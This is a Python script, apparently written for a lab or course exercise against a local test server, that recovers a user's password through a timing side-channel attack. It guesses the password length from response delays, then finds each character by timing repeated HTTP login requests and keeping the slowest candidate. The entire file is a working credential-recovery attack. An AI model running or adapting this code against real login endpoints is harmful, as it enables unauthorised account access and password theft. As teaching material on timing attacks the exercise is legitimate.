import asyncio
import aiohttp
import time
import numpy as np

# Configuration
SERVER_URL = "http://127.0.0.1"
USER_ID = "326647914"  # Replace with your ID
DIFFICULTY = 1         # Adjust difficulty if needed
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
NUM_ITERATIONS = 10    # Number of measurements for each character for greater accuracy


async def async_measure_time(session, user, password, difficulty):
    """Asynchronous version of measure_time"""
    url = f"{SERVER_URL}/?user={user}&password={password}&difficulty={difficulty}"
    try:
        start = time.time()
        async with session.get(url) as response:
            result = await response.text()
            end = time.time()
            return end - start, result.strip()
    except Exception as e:
        print(f"Connection error: {e}")
        return float("inf"), ""

async def find_password_length(session, user, difficulty, max_length=32):
    """Find password length by testing different lengths"""
    print("Determining password length...")
    
    # Test each possible length
    times = []
    for length in range(1, max_length + 1):
        test_password = "a" * length
        time_taken, response = await async_measure_time(session, user, test_password, difficulty)
        times.append((length, time_taken))
        print(f"Length {length}: {time_taken:.5f}s")
        
        # If we get a significant time increase, we've found the length
        if length > 1 and times[-1][1] - times[-2][1] < -0.1:  # Time decreased significantly
            return length - 1
    
    # If no clear pattern, return the length with the highest response time
    max_time_length = max(times, key=lambda x: x[1])[0]
    return max_time_length

async def find_password(session, user, difficulty, password_length):
    """Find password using multiple iterations per character"""
    print(f"Searching for password of length {password_length}...")
    found_chars = []

    for position in range(password_length):
        print(f"\nTesting position {position}")

        # Create tasks for all possible characters at current position
        char_times = []  # Store time taken for each character
        for char in CHARACTERS:
            # Build test password:
            # 1. Join all found characters so far
            # 2. Add current test character
            # 3. Fill remaining positions with 'a's
            test_password = (
                ''.join(found_chars) +  # Previously found characters
                char +                   # Current test character
                'a' * (password_length - position - 1)  # Fill rest with 'a's
            )

            # Run the test multiple times for the current character
            times = []
            for _ in range(NUM_ITERATIONS):
                time_taken, _ = await async_measure_time(session, user, test_password, difficulty)
                times.append(time_taken)

            # Calculate the average time for this character
            avg_time = sum(times) / NUM_ITERATIONS
            char_times.append((char, avg_time))
            print(f"Tested '{test_password}': Avg time = {avg_time:.5f}s")

        # Find the character with the highest average time
        best_char = max(char_times, key=lambda x: x[1])[0]
        found_chars.append(best_char)
        current_password = ''.join(found_chars) + 'a' * (password_length - len(found_chars))
        print(f"Found character at position {position}: {best_char}")
        print(f"Current password: {current_password}")

        # Verify current progress
        _, response = await async_measure_time(session, user, current_password, difficulty)
        if response == "1":
            print(f"\nFound valid password: {current_password}")
            return current_password

    final_password = ''.join(found_chars)
    return final_password

async def main():
    async with aiohttp.ClientSession() as session:
        try:
            # First find the password length
            password_length = await find_password_length(session, USER_ID, DIFFICULTY)
            print(f"\nDetected password length: {password_length}")
            
            if password_length:
                # Then find the password
                password = await find_password(session, USER_ID, DIFFICULTY, password_length)
                print(f"\nFinal password: {password}")
                
                # Verify the final password
                _, response = await async_measure_time(session, USER_ID, password, DIFFICULTY)
                if response == "1":
                    print("Password verified successfully!")
                else:
                    print("Password verification failed")
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    asyncio.run(main())